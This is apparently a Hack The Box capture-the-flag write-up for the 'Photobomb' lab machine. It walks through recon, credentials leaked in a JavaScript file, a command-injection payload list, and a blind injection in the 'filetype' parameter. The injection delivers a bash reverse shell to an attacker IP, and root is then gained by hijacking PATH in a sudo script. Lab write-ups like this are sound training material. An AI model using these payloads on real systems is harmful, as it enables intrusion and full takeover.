---
layout: post
author: H4
---

![banner](/images/photobomb_banner.png)  
[Link](https://app.hackthebox.com/machines/Photobomb)

# discovery

As usual we are starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 10.10.11.182                                                                                                                                                        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-12 05:35 EST
Nmap scan report for 10.10.11.182
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds
```

Accessing the website on port 80 shows the following website.  
![landing page](/images/photobomb_landing.png)

## dir busting
```bash
$ gobuster dir -u http://photobomb.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x asp,aspx,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://photobomb.htb/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2022/11/12 05:39:39 Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 200) [Size: 10990]
/printer.aspx         (Status: 401) [Size: 188]  
/printer              (Status: 401) [Size: 188]  
/printer.txt          (Status: 401) [Size: 188]  
/printers             (Status: 401) [Size: 188]  
/printer.html         (Status: 401) [Size: 188]  
/printers.txt         (Status: 401) [Size: 188]  
/printer.asp          (Status: 401) [Size: 188]  
/printers.html        (Status: 401) [Size: 188]  
/printers.asp         (Status: 401) [Size: 188]  
/printers.aspx        (Status: 401) [Size: 188]  
                                                 
===============================================================
2022/11/12 05:42:23 Finished
===============================================================
```

> Nothing useful could be identified.
{: .prompt-danger }

## credential leak 

Inside the JavaScript file `photobomb.js` are plaintext credentials stored.

### request
```http
GET /photobomb.js HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: */*
Referer: http://photobomb.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 12 Nov 2022 10:38:09 GMT
Content-Type: application/javascript;charset=utf-8
Content-Length: 339
Connection: close
Last-Modified: Wed, 14 Sep 2022 12:31:53 GMT
X-Content-Type-Options: nosniff

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
> Credentials: `pH0t0:b0Mb!`
{: .prompt-info }

---

# exploitation
The resource `/printer` (linked on the landing page) is password protected.  

`http://photobomb.htb/printer`  
![password protected area](/images/photobomb_htaccess.png)  

We can log in with the credentials `pH0t0:b0Mb!`.

Inside the protected area is a web application which allows downloading images.  

![logged in](/images/photobomb_loggedin.png)  

The following `HTTP` request is a normal download request for an image.

## request
```http
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 77
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg&dimensions=30x30
```

## response
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 12 Nov 2022 11:00:49 GMT
Content-Type: image/jpeg
Content-Length: 1035
Connection: close
Content-Disposition: attachment; filename=andrea-de-santis-uCFuP0Gc_MM-unsplash_30x30.jpg
X-Content-Type-Options: nosniff

ÿØÿà
```

Analyzing the request and the behaviour of the application implies that the server is performing some kind of processing on the image the user wants to download. So it is worth a try to check for command injection vulnerabilities in the parameters which are submitted to the application by the user.

## checking for command injection
We are using the `burp intruder` to check if one of the following injections work.

```
bogus
;id
|id
`id`
$i()d
;$i()d
|$i()d
FAIL||;$i()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```

The parameter `filetype` seems to be blind injectable (`sleep` delay).  

![burp intruder 1](/images/photobomb_intruder1.png)  
![burp intruder 2](/images/photobomb_intruder2.png)

We verifiy this by sending a simple `sleep` command.  
payload: `$(sleep 5)`

![rce poc](/images/photobomb_rce.png)

> Yes! The response takes more then 5 seconds.
{: .prompt-info }

## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80    
listening on [any] 80 ...
```

### trigger reverse shell
payload: `bash -c 'bash -i >& /dev/tcp/10.10.14.7/80 0>&1'`
```http
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 132
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg$(bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/80+0>%261')&dimensions=30x30
```

### catch connect from target
```bash
$ nc -lvp 80    
listening on [any] 80 ...
connect to [10.10.14.7] from photobomb.htb [10.10.11.182] 45830
bash: cannot set terminal process group (735): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ whoami
whoami
wizard
wizard@photobomb:~/photobomb$
```

> We got a shell!
{: .prompt-info }

---
# post exploitation
## get first flag
```bash
wizard@photobomb:~/photobomb$ ls
ls
log
photobomb.sh
public
resized_images
server.rb
source_images
wizard@photobomb:~/photobomb$ cd /home
cd /home
wizard@photobomb:/home$ ls
ls
wizard
wizard@photobomb:/home$ cd wizard
cd wizard
wizard@photobomb:~$ ls
ls
photobomb
user.txt
wizard@photobomb:~$ cat user.txt
cat user.txt
3******************************c
```

## privilege escalation

Checking if user `wizard` is allowed to execute commands as a super user.

```bash
$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

> We are allowed to execute `/opt/cleanup.sh` with super user permissions.
{: .prompt-info }

Lets check if we have write permissions on the file `cleanup.sh`.

```bash
$ ls -lsah /opt/cleanup.sh
ls -lsah /opt/cleanup.sh
4.0K -r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh
```

> Unfortunately we have no write permissions.
{: .prompt-danger }

Lets have a look into the file itself.

```bash
$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

There is one binary (`find`) used which is not called by its full path.

> So, we are able to exploit how `linux` handles its `PATH` priorities to gain `root` access.
{: .prompt-info }

At first lets create a '`bash`' file in the `/tmp` directory and make it executable.
```bash
$ echo bash > /tmp/find
echo bash > /tmp/find
$ chmod +x /tmp/find
chmod +x /tmp/find
```

Now we are executing `/opt/cleanup.sh` with `sudo` and aditionally we are specifying the `PATH` environment to start with `/tmp`.

```bash
$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
sudo PATH=/tmp:$PATH /opt/cleanup.sh
whoami
root
```

> There we go! Root!
{: .prompt-info }

## get second flag
```bash
cd /root
ls
root.txt
cat root.txt
8******************************f
```

Pwned! <@:-)
